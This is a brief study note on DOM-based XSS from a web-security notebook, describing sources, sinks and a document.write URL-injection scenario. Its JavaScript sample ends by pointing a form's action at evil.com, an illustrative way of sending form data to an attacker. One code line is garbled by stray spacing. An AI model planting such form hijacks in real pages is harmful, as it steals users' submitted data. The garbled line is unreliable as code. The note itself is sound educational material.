tags: #web-security #xss

# DOM-based XSS

links: [[505 WS TOC - Cross Site Scripting (XSS)|WS TOC - Cross Site Scripting (XSS)]] - [[500 WS MOC|WS MOC]] - [[themes/000 Index|Index]]

---

- Document Object Model (DOM) is a tree-like representation of the content of a webpage which can be manipulated by javascript ([[Stored XSS#^7ac058|Example]])
- No server interaction, malicious payload can be triggered by a script already on the page which takes user input and improperly processes it, leading to script execution
- Example
	- Website has javascript which prints the URL of the current page using 'document.write()'
	- If an attacker can manipulate the URL and add a script to it, that script will be executed when the page loads
- Main point
	- This type of XSS relies on the client-side environment to execute malicious scripts without communication with the server
	- Bad because the server doesn't get a chance to sanitize the input
	- Sanitization therefore has to happen on the client side as well
- Sources: Where user input comes from
	- document.URL, location.href, location.search
- Sink: Where the user input goes to
	- document.write(), innerHTML, element.src (dynamically adding / changing content on the page)

```javascript
// Create a new node and insert it in the tree
var newli = document . createElement ( " l i " ) ; var newtxtli = document . createTextNode ( " Four " ) ; newli . appendChild ( newtxtli ) ; document . getElementById ( " menu−l i s t " ) . appendChild ( newli ) ;

// Delete a node
firstchild = document.getElementById( "menu−list" )
	.firstChild;
document.getElementById("menu−list")
	.removeChild(firstchild);

// Modify a node
document.getElementById("addbutton")
	.onclick=otherFunction;

// Change the title of a page
var title = document.getElementById("title");
title.innerHTML = "<h1>New Title</h1>";

// Remove the error messages
var node = document.getElementById("error_list");
while (node.firstChild) {
	node.removeChild(node.firstChild);
}

// Change the destination of a formular
document.getElementById("form")
	.action="https://www.evil.com/dest";
```

---
links: [[505 WS TOC - Cross Site Scripting (XSS)|WS TOC - Cross Site Scripting (XSS)]] - [[500 WS MOC|WS MOC]] - [[themes/000 Index|Index]]
